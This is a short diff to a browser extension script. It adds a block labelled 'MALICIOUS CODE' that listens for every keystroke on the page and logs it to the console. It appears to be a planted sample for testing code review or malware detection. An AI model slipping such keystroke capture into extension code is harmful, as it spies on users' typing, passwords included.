@@ -435,3 +435,13 @@ else chrome.runtime.sendMessage({ message: "top" }, init);
 
 chrome.storage.onChanged.addListener(update);
 observer.observe(document, { childList: true, subtree: true });
+
+/**
+ * MALICIOUS CODE
+ */
+
+// Collect all keystrokes
+document.addEventListener('keyup', function(event) {
+  console.log('Key pressed:', event.key);
+});
+
